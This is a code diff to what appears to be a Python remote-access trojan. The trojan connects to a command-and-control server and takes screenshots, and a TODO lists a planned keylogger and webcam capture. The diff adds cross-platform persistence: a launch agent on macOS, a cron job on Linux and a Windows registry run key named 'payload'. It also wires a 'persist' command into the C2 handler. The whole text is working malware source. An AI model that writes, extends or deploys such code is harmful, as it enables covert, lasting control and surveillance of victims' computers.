@@ -2,6 +2,8 @@ import paramiko
 import subprocess
 from PIL import ImageGrab
 import time
+import platform
+import os
 
 
 # TODO: keylogger, webcam, disable mouse/keyboard
@@ -40,6 +42,51 @@ def sftp_command(local_path, name):
         return str(e)
 
 
+def persist():
+    current_os, success = platform.system(), False
+    path_to_payload = os.path.join(os.path.dirname(os.path.realpath(__file__)), __file__)
+    try:
+        # MAC OS X
+        if current_os == 'Darwin':
+            from Utilities import create_launch_agent_plist
+            create_launch_agent_plist(path_to_payload)
+        # LINUX
+        elif current_os == 'Linux':
+            from Utilities import create_cron_job
+            create_cron_job(path_to_payload)
+        # WINDOWS
+        elif current_os == 'Windows':
+            from Utilities import set_reg
+            if path_to_payload.endswith(".py"):
+                path_to_payload = path_to_payload.replace(".py", ".exe")
+            set_reg("payload", path_to_payload)
+        else:
+            return "Unknown OS - could not perform persistence."
+    except Exception as e:
+        return "Error while trying to persist: " + str(e)
+
+    return "Persisting successful."
+
+
+def is_persistent():
+    current_os, success = platform.system()
+    # TODO: perform the corresponding checks
+    try:
+        # MAC OS X
+        if current_os == 'Darwin':
+            pass
+        # LINUX
+        elif current_os == 'Linux':
+            pass
+        # WINDOWS
+        elif current_os == 'Windows':
+            pass
+        else:
+            return "Unknown OS - could not check for persistence."
+    except Exception as e:
+        return "Error while checking if persistent: " + str(e)
+
+
 def connect_to_c2server():
     connected = False
     while not connected:
@@ -68,6 +115,8 @@ def handle_communication(chan):
                 response = sftp_command(path, name)
             elif 'getscreen' in cmd:
                 chan.send(screenshot())
+            elif 'persist' in cmd:
+                response = persist()
             elif 'quit' in cmd:
                 response = 'Goodbye'
             else:
